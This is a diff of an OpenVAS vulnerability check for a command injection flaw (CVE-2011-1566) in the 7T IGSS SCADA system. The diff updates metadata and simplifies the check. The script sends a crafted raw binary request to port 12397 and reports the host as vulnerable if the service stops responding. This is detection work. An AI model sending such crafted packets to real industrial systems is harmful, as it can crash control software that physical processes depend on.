@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_igss_remote_command_exec_vuln_sep14.nasl 6735 2017-07-17 09:56:49Z teissa $
+# $Id: gb_igss_remote_command_exec_vuln_sep14.nasl 10968 2018-08-15 06:23:53Z cfischer $
 #
 # 7T Interactive Graphical SCADA System 'dc.exe' Command Injection Vulnerability
 #
@@ -27,13 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804768");
-  script_version("$Revision: 6735 $");
+  script_version("$Revision: 10968 $");
   script_cve_id("CVE-2011-1566");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-17 11:56:49 +0200 (Mon, 17 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-15 08:23:53 +0200 (Wed, 15 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-09-25 16:14:02 +0530 (Thu, 25 Sep 2014)");
-
 
   script_name("7T Interactive Graphical SCADA System 'dc.exe' Command Injection Vulnerability");
 
@@ -57,11 +56,11 @@ if(description)
 
   script_tag(name:"solution", value:"Upgrade to version 9.00.00.11083 or higher,
   For updates refer www.igss.com");
-
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17024");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/29129");
-  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/igss_8-adv.txt");
-  script_xref(name : "URL" , value : "https://ics-cert.us-cert.gov/alerts/ICS-ALERT-11-080-03");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17024");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/29129");
+  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/igss_8-adv.txt");
+  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/alerts/ICS-ALERT-11-080-03");
 
   script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -72,22 +71,17 @@ if(description)
   exit(0);
 }
 
-
-## Variable Initialization
 igssPort = 12397;
 
-## Check Port status
 if(!get_port_state(igssPort)){
   exit(0);
 }
 
-## Open the socket
 soc = open_sock_tcp(igssPort);
 if(!soc){
   exit(0);
 }
 
-## Constructed directory traversal crafted request
 req = raw_string(
     0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x01, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
@@ -125,23 +119,13 @@ req = raw_string(
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
 
-## send the attack request and receive the response
 send(socket:soc, data:req);
 res = recv(socket:soc, length:1024);
 close(soc);
 
-## Wait for some time
 sleep(3);
 
-## Check the port state
-if(!get_port_state(igssPort))
-{
-  security_message(port:igssPort);
-  exit(0);
-}
-
-## Check if it is possible to Open the socket
-else if(!open_sock_tcp(igssPort))
+if(!open_sock_tcp(igssPort))
 {
   security_message(port:igssPort);
   exit(0);
